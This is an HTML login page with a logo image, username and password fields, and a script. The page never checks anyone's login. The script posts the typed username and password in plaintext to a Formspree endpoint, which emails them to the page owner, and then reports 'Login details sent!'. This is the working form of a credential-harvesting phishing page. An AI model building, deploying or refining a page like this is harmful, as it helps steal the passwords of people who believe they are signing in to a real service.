<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login Page</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #f8f9fa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 380px;
      text-align: center;
    }

    .logo {
      font-size: 36px;
      font-weight: bold;
      margin-bottom: 20px;
      color: #1a73e8;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    input {
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
      font-size: 16px;
    }

    input:focus {
      border-color: #1a73e8;
    }

    button {
      background-color: #1a73e8;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
      transition: background-color 0.2s;
    }

    button:hover {
      background-color: #1669c1;
    }

    .msg {
      margin-top: 15px;
      color: green;
      font-size: 14px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
  <img src="OIP.jpeg" alt="My App Logo" style="width:120px; height:auto;">
</div>

    <form id="loginForm" autocomplete="off">
      <input type="text" id="username" name="username" placeholder="Enter Username" required />
      <input type="password" id="password" name="password" placeholder="Enter Password" required />
      <button type="submit">Login</button>
    </form>

    <div class="msg" id="msg">âœ… Login details sent!</div>
  </div>

  <script>
    const FORMSPREE_URL = "https://formspree.io/f/mqadgqvj"; // Replace with your Formspree URL

    const form = document.getElementById("loginForm");
    const msg = document.getElementById("msg");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      if (!username || !password) {
        alert("Please fill out all fields!");
        return;
      }

      // Send login data to your email via Formspree
      try {
        await fetch(FORMSPREE_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password })
        });

        msg.style.display = "block";

        // Clear the form after submit
        form.reset();
      } catch (error) {
        alert("Error sending data!");
      }
    });
  </script>
</body>
</html>
